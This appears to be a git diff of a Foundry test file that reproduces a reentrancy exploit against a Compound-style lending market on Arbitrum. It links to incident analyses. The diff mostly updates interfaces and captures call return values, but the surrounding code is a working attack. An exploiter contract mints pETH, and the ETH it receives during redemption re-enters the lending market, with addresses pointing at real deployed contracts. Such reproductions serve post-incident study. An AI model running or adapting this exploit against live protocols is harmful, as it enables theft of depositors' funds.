@@ -3,6 +3,12 @@ pragma solidity ^0.8.10;
 
 import "forge-std/Test.sol";
 
+import {IERC20Metadata as IERC20} from "src/interfaces/IERC20Metadata.sol";
+
+import {IWETH} from "src/interfaces/IWETH.sol";
+import {ICErc20Delegate} from "src/interfaces/ICErc20Delegate.sol";
+import {IAaveFlashloan} from "src/interfaces/IAaveFlashloan.sol";
+import {IUnitroller} from "src/interfaces/IUnitroller.sol";
 // @Analysis
 // https://twitter.com/Phalcon_xyz/status/1645742620897955842
 // https://twitter.com/BlockSecTeam/status/1645744655357575170
@@ -21,7 +27,7 @@ interface CurvePool {
 contract ContractTest is Test {
 
     IERC20 WBTC = IERC20(0x2f2a2543B76A4166549F7aaB2e75Bef0aefC5B0f);
-    IWFTM WETH = IWFTM(payable(0x82aF49447D8a07e3bd95BD0d56f35241523fBab1));
+    IWETH WETH = IWETH(payable(0x82aF49447D8a07e3bd95BD0d56f35241523fBab1));
     IERC20 USDT = IERC20(0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9);
     ICErc20Delegate pUSDT = ICErc20Delegate(0xD3e323a672F6568390f29f083259debB44C41f41);
     ICErc20Delegate pWBTC = ICErc20Delegate(0x367351F854506DA9B230CbB5E47332b8E58A1863);
@@ -81,7 +87,7 @@ contract ContractTest is Test {
         exploiter.mint();
 
         WETH.withdraw(WETH.balanceOf(address(this)));
-        payable(address(pETH)).call{value: address(this).balance}("");
+        (bool success6,) = payable(address(pETH)).call{value: address(this).balance}("");
         pUSDT.mint(USDT.balanceOf(address(this)));
         address[] memory cTokens = new address[](2);
         cTokens[0] = address(pETH);
@@ -91,7 +97,7 @@ contract ContractTest is Test {
         pETH.redeem(pETH.balanceOf(address(this))); // Reentrancy enter point
 
         exploiter.redeem();
-        payable(address(WETH)).call{value: address(this).balance}("");
+        (bool success7,) = payable(address(WETH)).call{value: address(this).balance}("");
         return true;
     }
 
@@ -114,17 +120,17 @@ contract ContractTest is Test {
 
 contract Exploiter is Test {
 
-    IERC20 WETH = IERC20(0x82aF49447D8a07e3bd95BD0d56f35241523fBab1);
+    IWETH WETH = IWETH(0x82aF49447D8a07e3bd95BD0d56f35241523fBab1);
     ICErc20Delegate pETH = ICErc20Delegate(0x375Ae76F0450293e50876D0e5bDC3022CAb23198);
 
     function mint() external payable {
         WETH.withdraw(WETH.balanceOf(address(this)));
-        payable(address(pETH)).call{value: address(this).balance}("");
+        (bool success8,) = payable(address(pETH)).call{value: address(this).balance}("");
     }
 
     function redeem() external payable {
         pETH.redeem(pETH.balanceOf(address(this)));
-        payable(address(WETH)).call{value: address(this).balance}("");
+        (bool success9,) = payable(address(WETH)).call{value: address(this).balance}("");
         WETH.transfer(msg.sender, WETH.balanceOf(address(this)));
     }
 
